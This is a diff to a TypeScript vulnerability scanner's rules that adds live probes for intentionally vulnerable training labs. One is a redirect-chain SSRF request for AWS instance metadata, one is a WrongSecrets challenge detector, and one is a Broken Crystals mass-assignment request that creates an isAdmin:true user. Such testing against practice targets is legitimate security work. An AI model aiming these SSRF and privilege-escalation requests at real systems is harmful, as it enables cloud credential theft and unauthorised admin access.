@@ -30754,6 +30754,96 @@ const ssrfVulnlabBlocklistBypassLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const ssrfVulnlabRedirectLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const innerTarget = "http://169.254.169.254/latest/meta-data/";
+  const redirectChain = `${ctx.origin}/r/?to=${encodeURIComponent(innerTarget)}`;
+  const probeUrl = new URL("/redirect/", ctx.origin);
+  probeUrl.searchParams.set("url", redirectChain);
+  const doc = await fetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  const metadataOk =
+    /^ami-id\b/m.test(body) &&
+    /^iam\//m.test(body) &&
+    /^instance-id\b/m.test(body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      redirectChain,
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev GET /redirect/?url=https://ssrf.vulnlab.dev/r/?to=<internal> passes vulnlab.dev host allow-list then follows redirect to AWS metadata — follow-redirect SSRF oracle"
+    }
+  };
+};
+
+function wrongsecretsChallengeIdFromUrl(url: string): string | null {
+  const m = url.match(/\/challenge\/(?:challenge-)?(\d+)\/?(?:\?|#|$)/i);
+  return m?.[1] ?? null;
+}
+
+const wrongsecretsChallengeLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || ctx.origin;
+  if (!/wrongsecrets/i.test(pageUrl)) return NEGATIVE;
+  const challengeId = wrongsecretsChallengeIdFromUrl(pageUrl);
+  if (!challengeId) return NEGATIVE;
+  const canonicalUrl = new URL(`/challenge/challenge-${challengeId}`, ctx.origin).toString();
+  const doc = await fetchDoc(canonicalUrl, { maxBytes: 65536, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/Find the secret hidden in/i.test(doc.body)) return NEGATIVE;
+  if (!/data-cy="answer-textbox"|Enter the secret you found/i.test(doc.body)) return NEGATIVE;
+  const markers: { label: string; sample: string }[] = [];
+  for (const { label, re } of [
+    { label: "WrongSecrets challenge answer UI", re: /data-cy="answer-textbox"/i },
+    {
+      label: "Docker ENV secret walkthrough",
+      re: /Docker ENV based password|docker history --no-trunc/i
+    },
+    {
+      label: "Docker build-arg layer walkthrough",
+      re: /Docker arg based password|layers got constructed/i
+    },
+    {
+      label: "Spring application.properties walkthrough",
+      re: /application\.properties|Spring Boot application/i
+    },
+    {
+      label: "Kubernetes configmap walkthrough",
+      re: /K8s Configmap|config-map in the default namespace/i
+    }
+  ]) {
+    const m = doc.body.match(re);
+    if (m) markers.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (markers.length < 2) return NEGATIVE;
+  const focus =
+    /Docker arg based password/i.test(doc.body)
+      ? "Docker build-arg layer secrets"
+      : /Docker ENV based password/i.test(doc.body)
+        ? "Docker ENV secrets"
+        : /application\.properties/i.test(doc.body)
+          ? "Spring application.properties secrets"
+          : /K8s Configmap/i.test(doc.body)
+            ? "Kubernetes configmap secrets"
+            : "hardcoded secrets";
+  return {
+    fired: true,
+    confidence: markers.length >= 3 ? 0.92 : 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      canonicalUrl,
+      challengeId,
+      markers: markers.slice(0, 4),
+      snippet: doc.body.match(/Find the secret hidden in[\s\S]{0,160}/i)?.[0]?.slice(0, 160) ?? "",
+      note: `WrongSecrets challenge ${challengeId} live oracle — canonical /challenge/challenge-${challengeId} documents ${focus} with answer submission UI`
+    }
+  };
+};
+
 // --- VulnLab Academy API testing labs (hack-this-site-eta.vercel.app/api-labs/*) ----
 const CLIENT_VULNLAB_API_LABS_RES: { label: string; re: RegExp }[] = [
   {
@@ -34549,6 +34639,50 @@ const brokencrystalsMassAssignmentPutLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const brokencrystalsAdminpermissionRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/adminpermission/i.test(pageUrl)) return NEGATIVE;
+  const email = `thugir-ap-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@thugir-probe.invalid`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/api/users/basic", ctx.origin).toString();
+  const createPayload = JSON.stringify({
+    isAdmin: true,
+    email,
+    firstName: "Thugir",
+    lastName: "Probe",
+    company: "ProbeCo",
+    cardNumber: "0000",
+    phoneNumber: "000-0000",
+    password,
+    op: "basic"
+  });
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: createPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 300) return NEGATIVE;
+  const token = await brokencrystalsLoginToken(ctx, email, password);
+  if (!token) return NEGATIVE;
+  const perm = await brokencrystalsAdminPermissionIsTrue(ctx, email, token, { bypassCache: true });
+  if (!perm.ok) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      createUrl,
+      adminPermissionUrl: perm.url,
+      email,
+      snippet: perm.snippet,
+      note: "Broken Crystals /api/users/one/{email}/adminpermission route scan — POST /api/users/basic isAdmin:true then GET adminpermission confirms privilege escalation"
+    }
+  };
+};
+
 const brokencrystalsHiddenUploadLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const uploadUrl = new URL("/api/hidden-upload", ctx.origin).toString();
@@ -36397,6 +36531,8 @@ export const RULES: Record<string, Rule> = {
   ssrfVulnlabBasicLiveOracle,
   ssrfVulnlabMetadataAwsLiveOracle,
   ssrfVulnlabBlocklistBypassLiveOracle,
+  ssrfVulnlabRedirectLiveOracle,
+  wrongsecretsChallengeLiveOracle,
   clientSideVulnlabApiLabsEvidence,
   clientSideVulnlabCmsPlatformEvidence,
   clientSideVulnlabRubyPlatformEvidence,
@@ -36471,6 +36607,7 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsFileLfiLiveOracle,
   brokencrystalsMassAssignmentLiveOracle,
   brokencrystalsMassAssignmentPutLiveOracle,
+  brokencrystalsAdminpermissionRouteLiveOracle,
   exposedApiConfig,
   sqliQueryParamInjection,
   sqliHeaderErrorDisclosure,
